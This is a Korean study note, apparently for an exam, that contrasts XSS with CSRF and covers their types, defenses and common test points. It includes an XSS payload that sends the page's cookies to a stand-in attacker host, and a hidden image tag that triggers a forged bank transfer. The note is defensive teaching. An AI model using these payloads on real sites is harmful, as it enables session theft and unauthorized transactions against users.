XSS(Cross-Site Scripting)와 CSRF(Cross-Site Request Forgery)는 둘 다 웹 브라우저를 매개로 하고 이름에 "Cross-Site"가 들어가 자주 혼동된다. 구분의 핵심은 **무엇의 신뢰를 악용하는가**다.

## 한 줄 정의

- **XSS**: 공격자가 삽입한 스크립트가 피해자 브라우저에서 실행된다. 사용자가 사이트를 신뢰하는 점, 즉 "사이트가 내려준 코드는 믿고 실행한다"는 브라우저의 전제를 악용한다.
- **CSRF**: 로그인된 피해자의 브라우저가 공격자가 의도한 요청을 서버로 보내게 만든다. 서버가 사용자의 브라우저를 신뢰하는 점, 즉 "쿠키가 붙어 온 요청은 본인이 보낸 것"이라는 가정을 악용한다.

## XSS의 원리와 유형

사용자 입력이 적절한 이스케이프 없이 HTML에 출력될 때 발생한다. 예를 들어 검색어를 그대로 페이지에 찍는 서버에 아래 입력이 들어가면, 피해자 브라우저에서 스크립트가 실행된다.

```text
<script>fetch('https://attacker.example/?c=' + document.cookie)</script>
```

| 유형 | 페이로드 위치 | 특징 |
|---|---|---|
| Stored | 서버 DB(게시글, 댓글 등) | 해당 페이지를 보는 모든 사용자에게 실행, 피해가 큼 |
| Reflected | 요청 URL·파라미터 | 피해자가 조작된 링크를 클릭해야 함 |
| DOM-based | 클라이언트 JS가 DOM에 반영하는 과정 | 서버 응답에 페이로드가 없을 수도 있음 |

실행된 스크립트는 해당 출처(origin)의 권한을 그대로 가지므로 쿠키·토큰 탈취, 화면 변조, 사용자 대신 요청 전송까지 가능하다.

**방어**: 출력 시점의 컨텍스트별 인코딩(HTML, 속성, JS, URL), 입력 검증, 쿠키에 `HttpOnly` 설정(스크립트의 쿠키 접근 차단), Content-Security-Policy(CSP)로 인라인 스크립트와 외부 출처 제한. 화이트리스트 기반 HTML 정제 라이브러리를 쓰는 것도 방법이다.

## CSRF의 원리

브라우저는 요청 대상 도메인의 쿠키를 요청을 일으킨 페이지와 무관하게 자동으로 붙인다. 피해자가 은행에 로그인한 상태에서 공격자의 페이지를 열면, 그 페이지에 숨겨진 요청이 세션 쿠키와 함께 은행으로 전송된다.

```text
<img src="https://bank.example/transfer?to=attacker&amount=1000000" width="0" height="0">
```

공격자는 응답을 볼 수 없고, 상태를 바꾸는 요청(송금, 비밀번호 변경, 글 삭제)만 일으킬 수 있다. 서버는 이 요청이 사용자의 의도인지 구분하지 못한다.

**방어**
- **CSRF 토큰**: 요청마다 예측 불가능한 값을 폼·헤더에 넣고 서버가 검증한다. 공격자는 다른 출처에서 이 값을 읽을 수 없다(동일 출처 정책).
- **SameSite 쿠키**: `Lax`/`Strict`이면 다른 사이트에서 시작된 요청에 쿠키를 붙이지 않는다. 기본값 동작은 브라우저와 버전에 따라 다르므로 명시하는 편이 안전하다.
- Referer/Origin 헤더 검증, 비밀번호 변경 같은 중요 작업에서의 재인증.
- 상태 변경에 GET을 쓰지 않는다.

## 시험 포인트

1. 구분 기준: XSS는 **클라이언트에서 스크립트 실행**, CSRF는 **사용자 권한으로 서버에 위조 요청**. 공격 대상이 전자는 사용자 브라우저, 후자는 서버 기능이라고 외우면 편하다.
2. CSRF는 인증된 세션이 전제다. 로그인 상태가 아니면 성립하지 않는다.
3. XSS가 있으면 CSRF 토큰도 스크립트로 읽어 낼 수 있어 토큰 방어가 무력화된다. 두 취약점은 독립이 아니라 XSS가 CSRF 방어를 깨는 관계다.
4. `HttpOnly`는 XSS로 인한 쿠키 탈취를 막지만, XSS 자체나 스크립트를 통한 요청 전송은 막지 못한다.
5. 방어 짝짓기: XSS는 출력 인코딩·CSP, CSRF는 토큰·SameSite. 서로 바꿔 내는 선지가 자주 나온다.
